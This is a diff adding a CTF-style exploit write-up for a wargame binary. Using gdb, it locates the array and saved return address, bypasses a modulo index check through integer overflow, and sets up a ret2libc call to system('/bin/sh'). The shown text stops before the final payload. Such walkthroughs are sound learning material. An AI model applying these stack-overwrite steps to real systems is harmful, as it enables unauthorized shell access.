@@ -1,0 +1,76 @@
+#in the main function, we have three possible functions:
+#read : read_number
+#store : store_number, to store any value in an array of 100 without any check of the index, so we can read in the stack
+#quit
+
+#we can notice that the argv and env are cleaned at the beginning and indexes % 3 == 0 are forbidden to store numbers in.
+#Our goal is to overwrite the EIP Address and apply Ret2libc
+
+#let's find the index of EIP on the tab
+#but, we have to find first the address of the array (index = 0)
+#we put a breakpoint at the start of the function read_number and get its argument(the array).
+(gdb) b read_number
+Breakpoint 1 at 0x80486dd
+(gdb) r
+[...]
+Input command: read
+[...]
+(gdb) x/x $ebp+0x8
+0xffffd440:	0xffffd464
+#0xffffd440 is the address where is stored the array address
+#0xffffd464 is the address of the array itself.
+#to get the index where is stored we calculate the difference between these 2 addresses
+#0xffffd440 - 0xffffd464 = -36
+#The array is an int tab[100], so the index is -36 / 4 = -9
+#we can verify this index
+Input command: read
+Index: -9
+Number at data[4294967287] is 4294956132
+Completed read command successfully
+#4294956132 == 0xffffd464 : the address of the array
+#now let's find the index of EIP in the read_number function
+b *main+520
+#get the frame infos
+(gdb) i f
+Stack level 0, frame at 0xffffd630:
+eip = 0x804892b in main; saved eip 0xf7e45513
+Arglist at 0xffffd628, args: 
+Locals at 0xffffd628, Previous frame's sp is 0xffffd630
+Saved registers:
+ebx at 0xffffd61c, ebp at 0xffffd628, esi at 0xffffd620, edi at 0xffffd624, eip at 0xffffd62c
+#address eip = 0xffffd62c
+#find the index of eip : 0xffffd62c - 0xffffd464 = 456, 456 / 4 = 114
+#let's verify this index
+Input command: read
+
+Index: 114
+Number at data[114] is 4158936339
+Completed read command successfully
+#4158936339 == 0xf7e45513
+(gdb) x/x 0xffffd62c
+0xffffd62c:	0xf7e45513
+#but this index is protected because 114 % 3 == 0
+#to get 114 by the overflow : (UINT_MAX / 4) + 114
+#4294967296 / 4 + 114 = 1073741938
+1073741938 % 3 = 1
+Input command: store
+Number: 42
+Index: 1073741938
+Completed store command successfully
+
+Input command: read
+Index: 114
+Number at data[114] is 42
+Completed read command successfully
+
+#let's now apply ret2libc(system + ret + "/bin/sh")
+(gdb) info function system
+All functions matching regular expression "system":
+
+Non-debugging symbols:
+0xf7e6aed0  __libc_system
+0xf7e6aed0  system => this address to take
+0xf7f48a50  svcerr_systemerr
+#let's find "/bin/sh" and put it at index 114 + 2 = 116 (it's is writable without any problem)
+#0xf7f897ec(4160264172) = address "/bin/sh"
+
